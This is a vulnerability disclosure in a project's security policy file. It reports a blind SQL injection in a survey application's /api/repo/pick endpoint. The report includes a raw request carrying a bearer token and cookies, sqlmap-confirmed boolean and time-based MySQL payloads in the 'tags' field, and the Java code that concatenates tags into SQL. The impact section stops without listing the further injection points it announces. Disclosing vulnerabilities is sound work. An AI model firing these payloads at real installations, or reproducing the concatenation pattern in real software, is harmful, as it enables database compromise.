# Security Policy

## Supported Versions

Use this section to tell people about which versions of your project are
currently being supported with security updates.

| Version | Supported          |
| ------- | ------------------ |
| 1.2.2   | :white_check_mark: |

## Reporting a Vulnerability

There is a serious SQL blind injection vulnerability.
The request is:
POST /api/repo/pick HTTP/1.1
Host: 192.168.20.5:1991
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Cache-Control: no-cache
X-XSRF-TOKEN: 
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjp7InVzZXJJZCI6IjE1ODU0NjQxNzc0NzUwNDc0MjYifSwiaWF0IjoxNjY2ODQxMTU4fQ.yQazbEpVCOuMizgpsMMIoJT9vvEfnx4DqcBXzAscB8PGH8BYCFFjhHO_pe4qOYZSfbOOe__TLhIzQODZWQlmZg
Expires: -1
Pragma: no-cache
Content-Length: 119
Origin: http://192.168.20.5:1991
Connection: keep-alive
Referring: http://192.168.20.5:1991/survey/L0ay62/edit?mode=exam
Cookie: Hm_lvt_43e89c38a9e9332e702161a0c19bba11=1666778105; Hm_lpvt_43e89c38a9e9332e702161a0c19bba11=1666842016; sk-token=eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjp7InVzZXJJZCI6IjE1ODU0NjQxNzc0NzUwNDc0MjYifSwiaWF0IjoxNjY2ODQxMTU4fQ.yQazbEpVCOuMizgpsMMIoJT9vvEfnx4DqcBXzAscB8PGH8BYCFFjhHO_pe4qOYZSfbOOe__TLhIzQODZWQlmZg

[{"id":"Axd_JDOJc_","repoId":"1585481117291630593","types":["Radio"],"tags":["简单"],"questionsNum":2,"examScore":1}]

Tags is the injection point.

Black box verification process

Go directly to SQLmap, the level is set to 3, and the final result is:

sqlmap identified the following injection point(s) with a total of 21258 HTTP(s) requests:
---
Parameter: JSON #4* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: [{"id":"Axd_JDOJc_","repoId":"1585481117291630593","types":["Radio"],"tags":["简单') AND 7642=7642 AND ('TlAO'='TlAO"],"questionsNum":2,"examScore":1}]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: [{"id":"Axd_JDOJc_","repoId":"1585481117291630593","types":["Radio"],"tags":["简单') AND (SELECT 8522 FROM (SELECT(SLEEP(5)))cRCX) AND ('AezM'='AezM"],"questionsNum":2,"examScore":1}]

---
back-end DBMS: MySQL >= 5.0.12

Parameter tags exist with SQL time-based blinds.

Source code analysis
Look at the controller first, which is located at: cn.surveyking.server.api.RepoApi#pickQuestionFromRepo file:
	@PostMapping("/pick")
	public List<SurveySchema> pickQuestionFromRepo(@RequestBody List<ProjectSetting.RandomSurveyCondition> repos) {
		return repoService.pickQuestionFromRepo(repos);
	}

Further trace the repoService implementation:
...
  List<Template> repoTemplates = templateService.list(Wrappers.<Template>lambdaQuery()
					.eq(Template::getRepoId, repo.getRepoId())
					.in(!CollectionUtils.isEmpty(repo.getTypes()), Template::getQuestionType, repo.getTypes())
					.exists(!CollectionUtils.isEmpty(repo.getTags()),
							String.format("select 1 from t_tag t where t.entity_id = t_template.id and t.name in (%s)",
									Optional.ofNullable(repo.getTags()).orElse(new ArrayList<>()).stream()
											.map(x -> "'" + x + "'").collect(Collectors.joining(",")))));
...
  
The lambda expression is clearly stitched with SQL statements. Therefore, it can be proved that there is a SQL injection vulnerability this time. 

Scaling and impact analysis
Further search of SQL statements reveals that the following injection possibilities are still possible:
It is recommended that developers abandon this code style of directly stitching SQL and fully filter characters.

